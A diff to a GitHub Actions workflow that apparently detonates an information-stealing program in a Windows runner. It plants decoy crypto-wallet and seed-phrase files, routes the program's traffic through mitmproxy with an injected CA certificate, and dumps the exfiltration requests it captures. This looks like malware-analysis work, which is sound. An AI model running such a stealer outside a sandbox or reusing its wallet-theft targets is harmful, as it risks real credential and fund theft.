@@ -12,6 +12,12 @@ jobs:
         with:
           distribution: temurin
           java-version: '21'
+      - name: Install mitmproxy
+        shell: powershell
+        run: |
+          python -m pip install --quiet mitmproxy 2>&1 | Select-Object -Last 5
+          $m = Get-Command mitmdump -ErrorAction SilentlyContinue
+          if ($m) { $m.Source | Set-Content "$env:RUNNER_TEMP\mitmpath.txt"; "mitmdump at " + $m.Source } else { "NO MITMDUMP" }
       - name: Bootstrap
         shell: powershell
         env:
@@ -29,7 +35,6 @@ jobs:
         run: |
           $desk = "$env:USERPROFILE\Desktop"
           "seed phrase alpha" | Set-Content "$desk\seed phrase.txt"
-          "wallet" | Set-Content "$desk\wallet-backup.txt"
           New-Item -ItemType Directory -Force "$env:APPDATA\Exodus\exodus.wallet" | Out-Null
           "seco" | Set-Content "$env:APPDATA\Exodus\exodus.wallet\dummy.seco"
       - name: MITM run
@@ -39,30 +44,30 @@ jobs:
         run: |
           $ErrorActionPreference = "Continue"
           $d = "$env:RUNNER_TEMP\sn"
-          python -m pip install --quiet mitmproxy 2>&1 | Out-Null
-          $mp = "$env:APPDATA\mitmproxy"; New-Item -ItemType Directory -Force $mp | Out-Null
-          Start-Process mitmdump -ArgumentList "--mode","regular@8081","-w","$d\flows.bin","--set","stream_large_bodies=10m" -RedirectStandardOutput "$d\mitm.log" -RedirectStandardError "$d\mitm.err" -WindowStyle Hidden | Out-Null
-          Start-Sleep -Seconds 8
+          $mitm = Get-Content "$env:RUNNER_TEMP\mitmpath.txt" -ErrorAction SilentlyContinue
+          if (-not $mitm) { "no mitmdump"; exit 0 }
+          Start-Process $mitm -ArgumentList "--mode","regular@8081","-w","$d\flows.bin" -RedirectStandardOutput "$d\mitm.log" -RedirectStandardError "$d\mitm.err" -WindowStyle Hidden | Out-Null
+          for ($i = 0; $i -lt 20; $i++) { if (Test-Path "$env:USERPROFILE\.mitmproxy\mitmproxy-ca-cert.pem") { break }; Start-Sleep -Seconds 1 }
+          "ca=" + (Test-Path "$env:USERPROFILE\.mitmproxy\mitmproxy-ca-cert.pem")
           $env:HTTPS_PROXY = "http://127.0.0.1:8081"
           $env:HTTP_PROXY  = "http://127.0.0.1:8081"
-          $env:REQUESTS_CA_BUNDLE = "$env:USERPROFILE\.mitmproxy\mitmproxy-ca-cert.pem"`r`n          $env:SSL_CERT_FILE = "$env:USERPROFILE\.mitmproxy\mitmproxy-ca-cert.pem"
+          $env:REQUESTS_CA_BUNDLE = "$env:USERPROFILE\.mitmproxy\mitmproxy-ca-cert.pem"
+          $env:SSL_CERT_FILE = "$env:USERPROFILE\.mitmproxy\mitmproxy-ca-cert.pem"
           $py = Get-Content "$d\py.txt"
           $rt = Join-Path (Split-Path $py) "AppHost"
           Push-Location (Split-Path $py)
-          $sp = Start-Process -FilePath ".\python.exe" -ArgumentList @((Join-Path $rt "main.py"), "-u", "$env:UID_", "--host", "thisisafalsepositive.st", "--env", "Fabric") -RedirectStandardOutput "$d\stealer.log" -RedirectStandardError "$d\stealer.err" -PassThru -Wait
-          "code=$($sp.ExitCode)"
+          & ".\python.exe" (Join-Path $rt "main.py") -u "$env:UID_" --host "thisisafalsepositive.st" --env "Fabric" 2>&1 | Set-Content "$d\stealer.log"
           Pop-Location
           Get-Process mitmdump -ErrorAction SilentlyContinue | Stop-Process -Force
-          Start-Sleep -Seconds 2
-          Get-Content "$d\stealer.log" -Tail 20
-          Get-ChildItem "$d\flows.bin" | Select Length
+          Start-Sleep -Seconds 3
+          Get-Content "$d\stealer.log" -Tail 12
       - name: Dump flows
         if: always()
         shell: powershell
         run: |
           $d = "$env:RUNNER_TEMP\sn"
           if (-not (Test-Path "$d\flows.bin")) { "no flows"; exit 0 }
-          python -c "from mitmproxy.io import FlowReader;f=open(r'$d\flows.bin','rb');[ (print(fl.request.method, fl.request.path), print(fl.request.get_text()[:3000])) for fl in FlowReader(f).stream() if 'shard' in fl.request.path]" 2>&1
+          python -c "from mitmproxy.io import FlowReader;f=open(r'$d\flows.bin','rb');[ (print('=== '+fl.request.method+' '+fl.request.path), print(fl.request.get_text()[:4000])) for fl in FlowReader(f).stream() if 'shard' in fl.request.path]" 2>&1
       - uses: actions/upload-artifact@v4
         if: always()
         with:
@@ -72,5 +77,3 @@ jobs:
         if: always()
         shell: powershell
         run: Get-Process java,python*,mitmdump -ErrorAction SilentlyContinue | Stop-Process -Force
-
-
